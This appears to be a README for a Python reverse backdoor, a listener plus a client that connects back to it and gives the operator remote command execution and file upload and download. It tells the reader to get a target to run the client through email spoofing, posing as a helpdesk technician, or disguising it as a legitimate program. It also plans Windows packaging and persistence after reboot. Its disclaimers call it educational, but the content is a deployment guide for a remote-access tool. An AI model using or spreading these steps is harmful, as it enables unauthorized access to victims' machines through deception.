# Python Reverse Backdoor

A Python-based reverse backdoor consisting of two components: a listener (server) and a reverse backdoor (client). Designed for educational purposes to demonstrate socket programming and remote command execution.
This program will run if both machines have a python interperter installed. 
You will have to use social engineering tactics to get the target to execute the reverse_backdoor python file on their computer. This can be done by using email spoofing, pretending to be a helpdesk techincian, or some other elaborate way. 
It is also possible to package the python file into an executable file that will run on a Windows machine without a python interpreter. Something to work on in the future. 

**Disclaimer**: Use this tool only in legal, authorized environments. Unauthorized access to computer systems is illegal and unethical. The developers assume no liability for misuse.

---

## Features

### Listener (Host)
- Listens for incoming connections from the target.
- Execute remote commands on the target machine.
- Upload/download files to/from the target.
- Persistent connection until manually terminated.

### Reverse Backdoor (Target)
- Connects back to the listener's IP and port.
- Supports commands: `cd`, `download`, `upload`, `exit`, and system commands (e.g., `ls`, `whoami`).
- Encodes files in base64 for transfer.

---

## Prerequisites

- Python 3 installed on both host and target machines.
- Host machine must allow incoming connections on the specified port.
- The target machine must execute the backdoor script.

---

## Usage

### 1. Configure the Backdoor
Edit `reverse_backdoor.py` to point to the listener's IP and port:
```bash
my_backdoor = Backdoor("LISTENER_IP", LISTENER_PORT)  # Replace with your listener's IP/port
```
### 2. Run the Listener
On the host machine:

```bash
python3 listener.py 0.0.0.0 4444
```
- 0.0.0.0 binds to all network interfaces.
- Ensure the port (e.g., 4444) is open and accessible.

### 3. Transfer the Backdoor to the Target
Use social engineering tactics (e.g., disguising the file as a legitimate program) to run reverse_backdoor.py on the target. Example:
```bash
python3 reverse_backdoor.py
```

### 4. Execute Commands
Once connected, use these commands in the listener:
- System Commands
```bash
>> ls -la
>> whoami
```

- Change Directory
```bash
>> cd /path/to/directory
```

- Download File
```bash
>> download file.txt
```

- Upload File
```bash
>> upload /path/to/local/file.txt
```

- Exit
```bash
>> exit
```

## File Structure
- listener.py
Run on the host machine. Listens for incoming connections and sends commands.

- reverse_backdoor.py
Run on the target machine. Connects to the listener and executes commands.

## Important Notes
🔒 Encode/Decode: Files are base64-encoded during transfer to avoid corruption.

⚠️ Firewall: Disable firewalls or configure port forwarding if connections fail.

🛑 Ethics: Obtain explicit permission before testing on any network or device.

## Future Improvements
- Convert reverse_backdoor.py into a standalone executable (e.g., .exe for Windows) using PyInstaller.

- Implement encryption for secure command transmission.

- Add persistence techniques to maintain access after reboot.

- Improve error handling and logging.

# Legal Disclaimer
#### This project is for educational purposes only. Unauthorized access to computer systems is illegal. The developers are not responsible for misuse. Ensure compliance with all applicable laws and obtain proper authorization before using this tool.
